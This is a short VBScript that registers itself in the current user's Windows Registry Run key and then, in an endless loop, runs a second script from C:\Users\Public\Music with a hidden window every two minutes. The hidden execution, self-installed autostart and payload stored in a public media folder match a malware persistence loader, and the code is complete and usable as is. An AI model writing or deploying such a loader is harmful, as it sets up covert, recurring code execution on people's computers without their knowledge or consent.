' Add this script to the Windows Registry to run on startup
Set WShell = CreateObject("WScript.Shell")
RegKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RunForever"
WShell.RegWrite RegKey, """" & WScript.ScriptFullName & """", "REG_SZ"

' Infinite loop to run run.vbs every 2 minutes
Do
    WShell.Run """C:\Users\Public\Music\run.vbs""", 0, True
    WScript.Sleep 120000 ' Sleep for 2 minutes (120,000 milliseconds)
Loop